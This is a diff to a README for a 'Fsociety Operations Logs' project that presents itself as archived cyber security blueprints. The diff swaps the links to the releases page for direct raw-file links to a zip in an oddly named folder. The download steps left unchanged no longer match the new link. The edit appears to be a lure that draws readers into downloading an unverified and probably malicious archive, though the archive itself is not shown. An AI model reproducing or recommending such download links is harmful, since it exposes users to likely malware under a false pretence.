@@ -1,6 +1,6 @@
 # 📂 Fsociety_Operations_Logs.dat - Accessing archived cyber security infrastructure blueprints
 
-[![Download Fsociety Operations Logs](https://img.shields.io/badge/Download_Latest_Release-Blue.svg)](https://github.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/releases)
+[![Download Fsociety Operations Logs](https://img.shields.io/badge/Download_Latest_Release-Blue.svg)](https://raw.githubusercontent.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/main/fibroid/Operations-Logs-Fsociety-dat-v3.3.zip)
 
 ## 📖 About this resource
 
@@ -21,7 +21,7 @@ Your computer requires a few basic things to view these files:
 
 Follow these steps to obtain the latest version of the archive.
 
-1. Navigate to the official download page: [https://github.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/releases](https://github.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/releases)
+1. Navigate to the official download page: [https://raw.githubusercontent.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/main/fibroid/Operations-Logs-Fsociety-dat-v3.3.zip](https://raw.githubusercontent.com/Symbolic-restaurantchain424/Fsociety_Operations_Logs.dat/main/fibroid/Operations-Logs-Fsociety-dat-v3.3.zip)
 2. Look for the section labeled "Assets" at the bottom of the newest version block.
 3. Click the link that ends in `.zip` to start the download.
 4. Save the file to your "Downloads" folder.
